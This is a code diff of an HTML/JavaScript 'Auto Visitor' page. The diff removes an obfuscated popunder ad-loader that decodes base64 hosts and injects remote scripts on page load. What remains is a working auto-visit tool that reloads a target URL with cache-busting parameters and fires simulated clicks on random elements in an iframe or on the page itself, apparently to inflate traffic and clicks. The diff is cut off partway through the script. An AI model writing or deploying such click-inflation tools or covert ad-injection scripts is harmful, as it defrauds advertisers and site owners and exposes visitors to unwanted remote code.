@@ -1,23 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var d=window,h="cd6ee060ba724175f3699c4800b65757",q=[["siteId",667-938*909-14*183+6143126],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LnhhZHNtYXJ0LmNvbS9uYW1hemV1aS5taW4uY3Nz","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQveUQvb3R3aXgubWluLmpz"],k=-1,v,b,j=function(){clearTimeout(b);k++;if(l[k]&&!(1801127972000<(new Date).getTime()&&1<k)){v=d.document.createElement("script");v.type="text/javascript";v.async=!0;var r=d.document.getElementsByTagName("script")[0];v.src="https://"+atob(l[k]);v.crossOrigin="anonymous";v.onerror=j;v.onload=function(){clearTimeout(b);d[h.slice(0,16)+h.slice(0,16)]||j()};b=setTimeout(j,5E3);r.parentNode.insertBefore(v,r)}};if(!d[h]){try{Object.freeze(d[h]=q)}catch(e){}j()}})();
-/*]]>/* */
-</script>
-
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Auto Visitor · Multi-Click + Parent Page Clicks</title>
+  <title>Auto Visitor · Dual Mode (Embed + Direct)</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
+    * { box-sizing: border-box; }
     body {
       background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
-      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      font-family: 'Inter', system-ui, sans-serif;
       margin: 0;
       min-height: 100vh;
       padding: 2rem 1.5rem;
@@ -25,18 +16,15 @@
       justify-content: center;
       align-items: center;
     }
-
     .automator-card {
       max-width: 1400px;
       width: 100%;
       background: rgba(15, 23, 42, 0.75);
       backdrop-filter: blur(2px);
       border-radius: 2.5rem;
-      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
       border: 1px solid rgba(56, 189, 248, 0.2);
       overflow: hidden;
     }
-
     .control-panel {
       padding: 1.5rem 2rem;
       background: rgba(2, 8, 23, 0.7);
@@ -45,39 +33,46 @@
       flex-wrap: wrap;
       gap: 1.2rem;
     }
-
-    .input-group {
-      flex: 2;
-      min-width: 200px;
+    .mode-toggle {
+      display: flex;
+      gap: 1rem;
+      background: #0f172a;
+      padding: 0.3rem;
+      border-radius: 3rem;
+      align-items: center;
     }
-
+    .mode-btn {
+      background: transparent;
+      border: none;
+      padding: 0.5rem 1.2rem;
+      border-radius: 2rem;
+      cursor: pointer;
+      font-weight: 600;
+      color: #94a3b8;
+      transition: 0.2s;
+    }
+    .mode-btn.active {
+      background: #38bdf8;
+      color: #0f172a;
+      box-shadow: 0 0 8px #38bdf8;
+    }
+    .input-group { flex: 2; min-width: 200px; }
     .input-group label {
       display: block;
       font-size: 0.7rem;
       font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 1px;
       color: #94a3b8;
       margin-bottom: 0.3rem;
     }
-
     .url-input {
       width: 100%;
       background: #0f172a;
       border: 1px solid #334155;
       border-radius: 1.2rem;
       padding: 0.7rem 1.2rem;
-      font-size: 0.9rem;
       color: #f1f5f9;
       font-family: monospace;
-      outline: none;
     }
-
-    .url-input:focus {
-      border-color: #38bdf8;
-      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
-    }
-
     .options-row {
       flex: 3;
       display: flex;
@@ -85,7 +80,6 @@
       gap: 1rem;
       align-items: flex-end;
     }
-
     .opt-item {
       display: flex;
       flex-direction: column;
@@ -94,13 +88,7 @@
       padding: 0.3rem 0.8rem;
       border-radius: 1rem;
     }
-
-    .opt-item label {
-      font-size: 0.65rem;
-      font-weight: 500;
-      color: #94a3b8;
-    }
-
+    .opt-item label { font-size: 0.65rem; color: #94a3b8; }
     .delay-input, .clicks-input {
       background: #0f172a;
       border: 1px solid #334155;
@@ -108,121 +96,44 @@
       padding: 0.4rem 0.8rem;
       width: 80px;
       color: white;
-      font-weight: 500;
       text-align: center;
     }
-
-    .exclude-input {
-      background: #0f172a;
-      border: 1px solid #334155;
-      border-radius: 1.2rem;
-      padding: 0.4rem 0.8rem;
-      width: 220px;
-      color: white;
-      font-size: 0.7rem;
-      font-family: monospace;
-    }
-
     .checkbox-label {
       display: flex;
       align-items: center;
       gap: 0.5rem;
       cursor: pointer;
-      font-size: 0.8rem;
-      color: #cbd5e1;
       background: #0f172a;
       padding: 0.4rem 1rem;
       border-radius: 2rem;
       border: 1px solid #334155;
+      color: #cbd5e1;
     }
-
-    .button-group {
-      display: flex;
-      gap: 1rem;
-    }
-
+    .button-group { display: flex; gap: 1rem; }
     .btn {
       border: none;
       font-weight: 600;
       padding: 0.6rem 1.4rem;
       border-radius: 2rem;
-      font-size: 0.85rem;
       cursor: pointer;
-      transition: 0.2s;
       background: #1e293b;
       color: #e2e8f0;
     }
-
-    .btn-start {
-      background: #0f3b2c;
-      color: #bbf7d0;
-      border: 1px solid #22c55e;
-    }
-
-    .btn-start:hover {
-      background: #166534;
-      transform: scale(0.97);
-    }
-
-    .btn-stop {
-      background: #3b1e2a;
-      border: 1px solid #ef4444;
-      color: #fecaca;
-    }
-
-    .btn-stop:hover {
-      background: #7f1d1d;
-    }
-
+    .btn-start { background: #0f3b2c; border: 1px solid #22c55e; color: #bbf7d0; }
+    .btn-stop { background: #3b1e2a; border: 1px solid #ef4444; color: #fecaca; }
     .status-area {
       display: flex;
       justify-content: space-between;
-      align-items: center;
       padding: 0.5rem 2rem;
       background: #02061760;
       font-size: 0.75rem;
       border-bottom: 1px solid #1e293b;
       flex-wrap: wrap;
-      gap: 0.5rem;
     }
-
-    .status-badge {
-      font-family: monospace;
-      background: #0f172a;
-      padding: 0.2rem 1rem;
-      border-radius: 3rem;
-      color: #7dd3fc;
-    }
-
-    .warning-note {
-      font-size: 0.7rem;
-      color: #facc15;
-      background: #422b00;
-      padding: 0.2rem 0.8rem;
-      border-radius: 2rem;
-    }
-
-    .viewport {
-      padding: 1rem 1.5rem 1.8rem 1.5rem;
-      background: #020617;
-    }
-
-    .iframe-wrapper {
-      border-radius: 1.5rem;
-      overflow: hidden;
-      box-shadow: 0 20px 35px -10px black;
-      border: 1px solid #2d3a5e;
-      background: #0f172a;
-    }
-
-    iframe {
-      width: 100%;
-      height: 550px;
-      display: block;
-      border: none;
-      background: white;
-    }
-
+    .status-badge { font-family: monospace; background: #0f172a; padding: 0.2rem 1rem; border-radius: 3rem; color: #7dd3fc; }
+    .viewport { padding: 1rem 1.5rem 1.8rem 1.5rem; background: #020617; }
+    .iframe-wrapper { border-radius: 1.5rem; overflow: hidden; border: 1px solid #2d3a5e; background: #0f172a; }
+    iframe { width: 100%; height: 550px; display: block; border: none; background: white; }
     .click-feedback {
       position: fixed;
       width: 28px;
@@ -233,499 +144,318 @@
       transform: translate(-50%, -50%);
       z-index: 9999;
       opacity: 0;
-      transition: opacity 0.15s ease;
-      box-shadow: 0 0 12px gold;
+      transition: opacity 0.15s;
     }
-
-    footer {
-      padding: 0.7rem 2rem;
-      text-align: center;
-      font-size: 0.7rem;
-      color: #4b556b;
-      border-top: 1px solid #1e293b;
-    }
-
+    footer { padding: 0.7rem 2rem; text-align: center; font-size: 0.7rem; color: #4b556b; border-top: 1px solid #1e293b; }
     @media (max-width: 1000px) {
-      .control-panel {
-        flex-direction: column;
-        align-items: stretch;
-      }
-      .options-row {
-        flex-direction: column;
-        align-items: stretch;
-      }
-      .button-group {
-        justify-content: stretch;
-      }
-      iframe {
-        height: 420px;
-      }
+      .control-panel { flex-direction: column; align-items: stretch; }
+      .options-row { flex-direction: column; align-items: stretch; }
+      iframe { height: 420px; }
     }
   </style>
 </head>
 <body>
-
 <div class="automator-card">
   <div class="control-panel">
-    <div class="input-group">
-      <label>🔗 TARGET URL</label>
+    <div class="mode-toggle">
+      <button id="modeEmbedBtn" class="mode-btn active">🌐 Embed mode (iframe)</button>
+      <button id="modeDirectBtn" class="mode-btn">📄 Direct mode (on this page)</button>
+    </div>
+    <div class="input-group" id="urlInputGroup">
+      <label>🔗 TARGET URL (embed mode only)</label>
       <input type="text" id="siteUrl" class="url-input" placeholder="https://example.com" value="https://example.com">
     </div>
-
     <div class="options-row">
-      <div class="opt-item">
-        <label>⏱️ CYCLE DELAY (sec)</label>
-        <input type="number" id="cycleDelay" class="delay-input" value="3" step="0.5" min="1" max="15">
-      </div>
-      <div class="opt-item">
-        <label>🎲 IFRAME CLICKS (min/max)</label>
-        <div style="display: flex; gap: 5px;">
-          <input type="number" id="minClicks" class="clicks-input" value="3" min="1" max="20" step="1">
-          <input type="number" id="maxClicks" class="clicks-input" value="4" min="1" max="20" step="1">
-        </div>
-      </div>
-      <div class="opt-item">
-        <label>⏲️ CLICK DELAY (sec)</label>
-        <input type="number" id="clickDelay" class="delay-input" value="0.15" step="0.05" min="0.05" max="1">
-      </div>
-      <div class="opt-item">
-        <label class="checkbox-label">
-          <input type="checkbox" id="randomClickToggle"> 🎯 Random iframe clicks
-        </label>
-      </div>
+      <div class="opt-item"><label>⏱️ CYCLE DELAY (sec)</label><input type="number" id="cycleDelay" class="delay-input" value="3" step="0.5" min="1"></div>
+      <div class="opt-item"><label>🎲 CLICKS (min/max)</label><div style="display:flex;gap:5px"><input type="number" id="minClicks" class="clicks-input" value="3" min="1"><input type="number" id="maxClicks" class="clicks-input" value="4" min="1"></div></div>
+      <div class="opt-item"><label>⏲️ CLICK DELAY (sec)</label><input type="number" id="clickDelay" class="delay-input" value="0.15" step="0.05"></div>
+      <div class="opt-item"><label class="checkbox-label"><input type="checkbox" id="randomClickToggle"> 🎯 Random positions</label></div>
     </div>
-
-    <!-- Parent clicks section -->
-    <div class="options-row" style="border-top: 1px solid #334155; padding-top: 0.8rem; margin-top: 0.2rem;">
-      <div class="opt-item">
-        <label class="checkbox-label">
-          <input type="checkbox" id="enableParentClicks"> 🖱️ Enable parent page clicks
-        </label>
-      </div>
-      <div class="opt-item">
-        <label>📄 PARENT CLICKS (min/max)</label>
-        <div style="display: flex; gap: 5px;">
-          <input type="number" id="parentMinClicks" class="clicks-input" value="1" min="0" max="10" step="1">
-          <input type="number" id="parentMaxClicks" class="clicks-input" value="2" min="0" max="10" step="1">
-        </div>
-      </div>
-      <div class="opt-item">
-        <label>🚫 Exclude selectors (CSS)</label>
-        <input type="text" id="excludeSelectors" class="exclude-input" value="button, .btn, input, select, textarea, a, [role=button], #targetFrame, .click-feedback, .btn-start, .btn-stop">
-      </div>
-    </div>
-
     <div class="button-group">
       <button id="startBtn" class="btn btn-start">▶ START LOOP</button>
       <button id="stopBtn" class="btn btn-stop">⏹️ STOP</button>
     </div>
   </div>
-
   <div class="status-area">
     <div class="status-badge" id="statusMsg">⚡ idle</div>
-    <div class="warning-note" id="securityNote">
-      ⚠️ Cross-origin: deep clicks only if SAME ORIGIN (else surface clicks)
-    </div>
     <div class="status-badge" id="cycleCounter">🔄 cycles: 0</div>
   </div>
-
-  <div class="viewport">
-    <div class="iframe-wrapper">
-      <iframe id="targetFrame" title="target site viewer" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation"></iframe>
-    </div>
+  <div class="viewport" id="viewportEmbed">
+    <div class="iframe-wrapper"><iframe id="targetFrame" title="target site" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation"></iframe></div>
   </div>
-  <footer>
-    💡 <strong>New: Parent page clicks</strong> — after iframe clicks, the script clicks random elements on this control panel (excluding buttons/inputs). Configurable min/max and exclude selectors.
-  </footer>
+  <footer>💡 <strong>Embed mode</strong>: clicks inside iframe (surface if cross‑origin). <strong>Direct mode</strong>: clicks real elements on current page + refreshes page. All settings apply.</footer>
 </div>
-
 <div id="clickEffect" class="click-feedback"></div>
 
 <script>
   (function() {
     // DOM elements
-    const urlInput = document.getElementById('siteUrl');
+    const modeEmbedBtn = document.getElementById('modeEmbedBtn');
+    const modeDirectBtn = document.getElementById('modeDirectBtn');
+    const urlInputGroup = document.getElementById('urlInputGroup');
+    const siteUrlInput = document.getElementById('siteUrl');
     const startBtn = document.getElementById('startBtn');
     const stopBtn = document.getElementById('stopBtn');
     const iframe = document.getElementById('targetFrame');
+    const viewportEmbed = document.getElementById('viewportEmbed');
     const statusSpan = document.getElementById('statusMsg');
     const cycleCounterSpan = document.getElementById('cycleCounter');
-    const delayInput = document.getElementById('cycleDelay');
+    const cycleDelayInput = document.getElementById('cycleDelay');
     const minClicksInput = document.getElementById('minClicks');
     const maxClicksInput = document.getElementById('maxClicks');
     const clickDelayInput = document.getElementById('clickDelay');
     const randomClickToggle = document.getElementById('randomClickToggle');
-    const enableParentClicks = document.getElementById('enableParentClicks');
-    const parentMinClicks = document.getElementById('parentMinClicks');
-    const parentMaxClicks = document.getElementById('parentMaxClicks');
-    const excludeSelectorsInput = document.getElementById('excludeSelectors');
     const clickEffectDiv = document.getElementById('clickEffect');
 
     // state
+    let currentMode = 'embed'; // 'embed' or 'direct'
     let running = false;
     let cycleCount = 0;
     let currentTimeout = null;
     let currentLoadHandler = null;
-    let currentBaseUrl = '';
     let currentSafetyTimer = null;
+    let directRefreshTimeout = null;
 
-    // helper: normalize URL
-    function normalizeUrl(raw) {
-      let url = raw.trim();
-      if (!url) return '';
-      if (!/^https?:\/\//i.test(url)) {
-        url = 'https://' + url;
-      }
-      return url;
-    }
-
-    function addForceReloadParam(url) {
-      try {
-        const urlObj = new URL(url);
-        urlObj.searchParams.set('_autorefresh', Date.now());
-        return urlObj.toString();
-      } catch (e) {
-        return url + (url.includes('?') ? '&' : '?') + '_autorefresh=' + Date.now();
-      }
-    }
-
+    // Helper: show click ripple
     function showClickRipple(clientX, clientY, color = '#ffd966') {
       if (!clickEffectDiv) return;
       clickEffectDiv.style.background = `radial-gradient(circle, ${color}, #ffaa33)`;
       clickEffectDiv.style.left = clientX + 'px';
       clickEffectDiv.style.top = clientY + 'px';
       clickEffectDiv.style.opacity = '0.9';
-      setTimeout(() => {
-        if (clickEffectDiv) clickEffectDiv.style.opacity = '0';
-      }, 180);
-      setTimeout(() => {
-        if (clickEffectDiv) clickEffectDiv.style.background = `radial-gradient(circle, #ffd966, #ffaa33)`;
-      }, 200);
+      setTimeout(() => { if (clickEffectDiv) clickEffectDiv.style.opacity = '0'; }, 180);
+      setTimeout(() => { if (clickEffectDiv) clickEffectDiv.style.background = `radial-gradient(circle, #ffd966, #ffaa33)`; }, 200);
     }
 
-    // ---- IFRAME CLICKS (same as before) ----
-    function tryDeepClickInsideIframe(iframeElement, randomMode) {
+    // ----- EMBED MODE LOGIC (iframe) -----
+    function normalizeUrl(url) {
+      let u = url.trim();
+      if (!u) return '';
+      if (!/^https?:\/\//i.test(u)) u = 'https://' + u;
+      return u;
+    }
+    function addForceReloadParam(url) {
       try {
-        const doc = iframeElement.contentDocument;
+        const urlObj = new URL(url);
+        urlObj.searchParams.set('_autorefresh', Date.now());
+        return urlObj.toString();
+      } catch(e) { return url + (url.includes('?')?'&':'?') + '_autorefresh=' + Date.now(); }
+    }
+    function tryDeepClickInsideIframe(randomMode) {
+      try {
+        const doc = iframe.contentDocument;
         if (!doc) return false;
         const body = doc.body;
         if (!body) return false;
-        
         let targetElement;
         if (randomMode) {
-          const allElements = doc.querySelectorAll('a, button, input, div, p, span, img');
-          if (allElements.length > 0) {
-            const randomIndex = Math.floor(Math.random() * allElements.length);
-            targetElement = allElements[randomIndex];
-          } else {
-            targetElement = body;
-          }
-        } else {
-          targetElement = body;
-        }
-        
-        const win = iframeElement.contentWindow;
-        let rect;
+          const els = doc.querySelectorAll('a, button, input, div, p, span, img');
+          if (els.length) targetElement = els[Math.floor(Math.random() * els.length)];
+          else targetElement = body;
+        } else targetElement = body;
+        const win = iframe.contentWindow;
+        let clickX, clickY;
         if (targetElement === body) {
-          const viewWidth = win.innerWidth || doc.documentElement.clientWidth;
-          const viewHeight = win.innerHeight || doc.documentElement.clientHeight;
-          const centerX = viewWidth / 2;
-          const centerY = viewHeight / 2;
-          const clickEvent = new MouseEvent('click', {
-            view: win,
-            bubbles: true,
-            cancelable: true,
-            clientX: centerX,
-            clientY: centerY
-          });
-          targetElement.dispatchEvent(clickEvent);
-          const iframeRect = iframeElement.getBoundingClientRect();
-          const globalX = iframeRect.left + (centerX / (win.innerWidth || 1)) * iframeRect.width;
-          const globalY = iframeRect.top + (centerY / (win.innerHeight || 1)) * iframeRect.height;
-          showClickRipple(globalX, globalY, '#ffd966');
-          return true;
+          const w = win.innerWidth || doc.documentElement.clientWidth;
+          const h = win.innerHeight || doc.documentElement.clientHeight;
+          clickX = w/2; clickY = h/2;
         } else {
-          const elRect = targetElement.getBoundingClientRect();
-          const clickX = elRect.left + elRect.width / 2;
-          const clickY = elRect.top + elRect.height / 2;
-          const clickEvent = new MouseEvent('click', {
-            view: win,
-            bubbles: true,
-            cancelable: true,
-            clientX: clickX,
-            clientY: clickY
-          });
-          targetElement.dispatchEvent(clickEvent);
-          const iframeRect = iframeElement.getBoundingClientRect();
-          const scaleX = iframeRect.width / (win.innerWidth || 1);
-          const scaleY = iframeRect.height / (win.innerHeight || 1);
-          const globalX = iframeRect.left + clickX * scaleX;
-          const globalY = iframeRect.top + clickY * scaleY;
-          showClickRipple(globalX, globalY, '#ffd966');
-          return true;
+          const rect = targetElement.getBoundingClientRect();
+          clickX = rect.left + rect.width/2;
+          clickY = rect.top + rect.height/2;
         }
-      } catch (err) {
-        return false;
-      }
+        const clickEvent = new MouseEvent('click', { view: win, bubbles: true, cancelable: true, clientX: clickX, clientY: clickY });
+        targetElement.dispatchEvent(clickEvent);
+        const iframeRect = iframe.getBoundingClientRect();
+        const scaleX = iframeRect.width / (win.innerWidth || 1);
+        const scaleY = iframeRect.height / (win.innerHeight || 1);
+        const globalX = iframeRect.left + clickX * scaleX;
+        const globalY = iframeRect.top + clickY * scaleY;
+        showClickRipple(globalX, globalY, '#ffd966');
+        return true;
+      } catch(e) { return false; }
     }
-
-    function simulateClickOnIframeSurface(iframeElement, randomMode) {
-      const rect = iframeElement.getBoundingClientRect();
-      if (rect.width === 0 || rect.height === 0) return;
-      let clickX, clickY;
-      if (randomMode) {
-        clickX = rect.left + Math.random() * rect.width;
-        clickY = rect.top + Math.random() * rect.height;
-      } else {
-        clickX = rect.left + rect.width / 2;
-        clickY = rect.top + rect.height / 2;
-      }
-      const clickEvent = new MouseEvent('click', {
-        view: window,
-        bubbles: true,
-        cancelable: true,
-        clientX: clickX,
-        clientY: clickY
-      });
-      iframeElement.dispatchEvent(clickEvent);
-      showClickRipple(clickX, clickY, '#ffaa66');
+    function simulateClickOnIframeSurface(randomMode) {
+      const rect = iframe.getBoundingClientRect();
+      if (rect.width === 0) return;
+      let x, y;
+      if (randomMode) { x = rect.left + Math.random() * rect.width; y = rect.top + Math.random() * rect.height; }
+      else { x = rect.left + rect.width/2; y = rect.top + rect.height/2; }
+      iframe.dispatchEvent(new MouseEvent('click', { view: window, bubbles: true, clientX: x, clientY: y }));
+      showClickRipple(x, y, '#ffaa66');
     }
-
-    async function performOneIframeClick(randomMode) {
-      if (!running) return false;
-      const clickedInside = tryDeepClickInsideIframe(iframe, randomMode);
-      if (!clickedInside) {
-        simulateClickOnIframeSurface(iframe, randomMode);
-        return false;
-      }
-      return true;
-    }
-
-    async function performIframeClickSequence() {
-      if (!running) return;
-      let min = parseInt(minClicksInput.value, 10);
-      let max = parseInt(maxClicksInput.value, 10);
-      if (isNaN(min)) min = 3;
-      if (isNaN(max)) max = 4;
-      if (min > max) { let tmp = min; min = max; max = tmp; }
-      if (min < 1) min = 1;
-      const numClicks = Math.floor(Math.random() * (max - min + 1)) + min;
+    async function performEmbedClick() {
       const randomMode = randomClickToggle.checked;
-      const interClickDelaySec = parseFloat(clickDelayInput.value);
-      const delayMs = Math.max(50, (isNaN(interClickDelaySec) ? 0.15 : interClickDelaySec) * 1000);
-      
-      statusSpan.innerHTML = `🖱️ iframe: ${numClicks} click(s) ...`;
-      for (let i = 0; i < numClicks; i++) {
-        if (!running) break;
-        statusSpan.innerHTML = `🖱️ iframe click ${i+1}/${numClicks} ${randomMode ? '🎲 random' : '📍 center'}`;
-        await performOneIframeClick(randomMode);
-        if (i < numClicks - 1 && running) {
-          await new Promise(resolve => setTimeout(resolve, delayMs));
-        }
+      const ok = tryDeepClickInsideIframe(randomMode);
+      if (!ok) simulateClickOnIframeSurface(randomMode);
+    }
+    async function performEmbedClickSequence() {
+      let min = parseInt(minClicksInput.value,10), max = parseInt(maxClicksInput.value,10);
+      if (isNaN(min)) min=3; if (isNaN(max)) max=4;
+      if (min>max) {let t=min; min=max; max=t;}
+      const num = Math.floor(Math.random() * (max-min+1)) + min;
+      const delayMs = Math.max(50, (parseFloat(clickDelayInput.value)||0.15)*1000);
+      for (let i=0; i<num && running; i++) {
+        await performEmbedClick();
+        if (i < num-1 && running) await new Promise(r => setTimeout(r, delayMs));
       }
-      if (running) statusSpan.innerHTML = `✅ iframe clicks done.`;
     }
 
-    // ---- PARENT PAGE CLICKS (new) ----
-    async function performParentClicks() {
-      if (!enableParentClicks.checked) return;
-      let min = parseInt(parentMinClicks.value, 10);
-      let max = parseInt(parentMaxClicks.value, 10);
-      if (isNaN(min)) min = 1;
-      if (isNaN(max)) max = 2;
-      if (min > max) { let tmp = min; min = max; max = tmp; }
-      if (min < 0) min = 0;
-      const numClicks = Math.floor(Math.random() * (max - min + 1)) + min;
-      if (numClicks === 0) return;
-      
-      const excludeSelector = excludeSelectorsInput.value.trim() || "button, .btn, input, select, textarea, a";
-      const interClickDelaySec = parseFloat(clickDelayInput.value);
-      const delayMs = Math.max(50, (isNaN(interClickDelaySec) ? 0.15 : interClickDelaySec) * 1000);
-      
-      statusSpan.innerHTML = `📄 parent: ${numClicks} click(s) on page ...`;
-      for (let i = 0; i < numClicks; i++) {
-        if (!running) break;
-        // get all elements in parent document that are visible and not excluded
-        const allElements = Array.from(document.querySelectorAll('body *'));
-        const clickableCandidates = allElements.filter(el => {
-          if (!el.isConnected) return false;
-          const rect = el.getBoundingClientRect();
-          if (rect.width <= 0 || rect.height <= 0) return false;
-          // exclude if matches any exclude selector
-          if (el.matches && el.matches(excludeSelector)) return false;
-          // also exclude ancestors that are excluded? simple version: just element itself.
-          // additionally, never click on the click effect div or iframe itself (already in exclude)
-          return true;
-        });
-        
-        if (clickableCandidates.length === 0) {
-          statusSpan.innerHTML = `⚠️ No clickable parent elements (check exclude list)`;
-          break;
-        }
-        
-        const randomIndex = Math.floor(Math.random() * clickableCandidates.length);
-        const targetEl = clickableCandidates[randomIndex];
-        const rect = targetEl.getBoundingClientRect();
-        const clickX = rect.left + rect.width / 2;
-        const clickY = rect.top + rect.height / 2;
-        
-        const clickEvent = new MouseEvent('click', {
-          view: window,
-          bubbles: true,
-          cancelable: true,
-          clientX: clickX,
-          clientY: clickY
-        });
-        targetEl.dispatchEvent(clickEvent);
-        showClickRipple(clickX, clickY, '#88ccff');
-        statusSpan.innerHTML = `📄 parent click ${i+1}/${numClicks} on ${targetEl.tagName.toLowerCase()}`;
-        
-        if (i < numClicks - 1 && running) {
-          await new Promise(resolve => setTimeout(resolve, delayMs));
-        }
-      }
-      if (running) statusSpan.innerHTML = `✅ parent clicks done.`;
+    // ----- DIRECT MODE LOGIC (real page clicks + refresh) -----
+    function getClickableElements() {
+      const exclude = 'button, .mode-btn, .btn, input, select, textarea, a, [role=button], .auto-panel, .click-feedback, #startBtn, #stopBtn, #modeEmbedBtn, #modeDirectBtn';
+      return Array.from(document.querySelectorAll('body *')).filter(el => {
+        if (!el.isConnected) return false;
+        const rect = el.getBoundingClientRect();
+        if (rect.width <= 0 || rect.height <= 0) return false;
+        if (el.closest('.mode-toggle') || el.closest('.button-group') || el.closest('.control-panel')) return false;
+        if (el.matches && el.matches(exclude)) return false;
+        return true;
+      });
     }
-
-    // refresh iframe
-    function refreshIframe(url) {
-      if (!url) return false;
-      const reloadUrl = addForceReloadParam(url);
-      if (currentLoadHandler) {
-        iframe.removeEventListener('load', currentLoadHandler);
-        currentLoadHandler = null;
-      }
-      iframe.src = reloadUrl;
+    async function performDirectClick() {
+      const elements = getClickableElements();
+      if (elements.length === 0) return false;
+      const target = elements[Math.floor(Math.random() * elements.length)];
+      const rect = target.getBoundingClientRect();
+      const x = rect.left + rect.width/2;
+      const y = rect.top + rect.height/2;
+      const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true, clientX: x, clientY: y });
+      target.dispatchEvent(clickEvent);
+      showClickRipple(x, y, '#88ccff');
       return true;
     }
+    async function performDirectClickSequence() {
+      let min = parseInt(minClicksInput.value,10), max = parseInt(maxClicksInput.value,10);
+      if (isNaN(min)) min=3; if (isNaN(max)) max=4;
+      if (min>max) {let t=min; min=max; max=t;}
+      const num = Math.floor(Math.random() * (max-min+1)) + min;
+      const delayMs = Math.max(50, (parseFloat(clickDelayInput.value)||0.15)*1000);
+      for (let i=0; i<num && running; i++) {
+        await performDirectClick();
+        if (i < num-1 && running) await new Promise(r => setTimeout(r, delayMs));
+      }
+    }
 
-    // main cycle: refresh -> wait load -> iframe clicks -> parent clicks -> wait cycle delay -> repeat
-    function startCycle() {
+    // ----- CYCLE CONTROLLER (mode-aware) -----
+    async function runCycle() {
       if (!running) return;
-      if (currentLoadHandler) {
-        iframe.removeEventListener('load', currentLoadHandler);
-        currentLoadHandler = null;
-      }
-      
-      const baseUrl = currentBaseUrl;
-      if (!baseUrl) {
-        statusSpan.innerHTML = '⚠️ Invalid URL. Stopping.';
-        stopAutomation();
-        return;
-      }
-      
-      statusSpan.innerHTML = `🔄 REFRESHING → ${new URL(baseUrl).hostname}`;
-      refreshIframe(baseUrl);
-      
-      const onLoadHandler = async () => {
+      if (currentMode === 'embed') {
+        // embed: refresh iframe -> wait load -> clicks -> delay -> repeat
+        if (currentLoadHandler) iframe.removeEventListener('load', currentLoadHandler);
+        const baseUrl = normalizeUrl(siteUrlInput.value);
+        if (!baseUrl) { stopAutomation(); statusSpan.innerHTML = '❌ Invalid URL'; return; }
+        iframe.src = addForceReloadParam(baseUrl);
+        statusSpan.innerHTML = `🔄 Refreshing iframe...`;
+        const onLoad = async () => {
+          if (!running) return;
+          await performEmbedClickSequence();
+          if (!running) return;
+          const cycleDelaySec = parseFloat(cycleDelayInput.value) || 3;
+          statusSpan.innerHTML = `⏳ Wait ${cycleDelaySec}s then next cycle`;
+          if (currentTimeout) clearTimeout(currentTimeout);
+          currentTimeout = setTimeout(() => {
+            if (running) { cycleCount++; cycleCounterSpan.innerText = `🔄 cycles: ${cycleCount}`; runCycle(); }
+          }, cycleDelaySec * 1000);
+          if (currentLoadHandler) iframe.removeEventListener('load', currentLoadHandler);
+        };
+        currentLoadHandler = onLoad;
+        iframe.addEventListener('load', currentLoadHandler);
+        // safety timeout
+        if (currentSafetyTimer) clearTimeout(currentSafetyTimer);
+        currentSafetyTimer = setTimeout(() => {
+          if (running && currentLoadHandler) {
+            iframe.removeEventListener('load', currentLoadHandler);
+            currentLoadHandler = null;
+            performEmbedClickSequence().then(() => {
+              if (running) {
+                const cycleDelaySec = parseFloat(cycleDelayInput.value) || 3;
+                currentTimeout = setTimeout(() => {
+                  if (running) { cycleCount++; cycleCounterSpan.innerText = `🔄 cycles: ${cycleCount}`; runCycle(); }
+                }, cycleDelaySec * 1000);
+              }
+            });
+          }
+        }, 10000);
+      } 
+      else { // direct mode
+        await performDirectClickSequence();
         if (!running) return;
-        // 1. perform iframe clicks
-        await performIframeClickSequence();
-        if (!running) return;
-        // 2. perform parent page clicks (if enabled)
-        await performParentClicks();
-        if (!running) return;
-        
-        const cycleDelaySec = parseFloat(delayInput.value);
-        const cycleDelayMs = Math.max(1000, (isNaN(cycleDelaySec) ? 3 : cycleDelaySec) * 1000);
-        statusSpan.innerHTML = `⏳ waiting ${cycleDelayMs/1000}s before next refresh...`;
-        if (currentTimeout) clearTimeout(currentTimeout);
-        currentTimeout = setTimeout(() => {
+        const cycleDelaySec = parseFloat(cycleDelayInput.value) || 3;
+        statusSpan.innerHTML = `⏳ Wait ${cycleDelaySec}s then refresh page`;
+        if (directRefreshTimeout) clearTimeout(directRefreshTimeout);
+        directRefreshTimeout = setTimeout(() => {
           if (running) {
             cycleCount++;
             cycleCounterSpan.innerText = `🔄 cycles: ${cycleCount}`;
-            startCycle();
+            statusSpan.innerHTML = `🔄 Refreshing page...`;
+            location.reload();
           }
-        }, cycleDelayMs);
-        
-        if (currentLoadHandler) {
-          iframe.removeEventListener('load', currentLoadHandler);
-          currentLoadHandler = null;
-        }
-      };
-      
-      currentLoadHandler = onLoadHandler;
-      iframe.addEventListener('load', currentLoadHandler);
-      
-      // safety: if iframe never loads, still continue after 10 sec
-      if (currentSafetyTimer) clearTimeout(currentSafetyTimer);
-      currentSafetyTimer = setTimeout(() => {
-        if (running && currentLoadHandler) {
-          iframe.removeEventListener('load', currentLoadHandler);
-          currentLoadHandler = null;
-          // force proceed
-          (async () => {
-            await performIframeClickSequence();
-            if (running) await performParentClicks();
-            if (running) {
-              const cycleDelaySec = parseFloat(delayInput.value);
-              const cycleDelayMs = Math.max(1000, (isNaN(cycleDelaySec) ? 3 : cycleDelaySec) * 1000);
-              currentTimeout = setTimeout(() => {
-                if (running) {
-                  cycleCount++;
-                  cycleCounterSpan.innerText = `🔄 cycles: ${cycleCount}`;
-                  startCycle();
-                }
-              }, cycleDelayMs);
-            }
-          })();
-        }
-      }, 10000);
+        }, cycleDelaySec * 1000);
+      }
     }
-    
+
     function stopAutomation() {
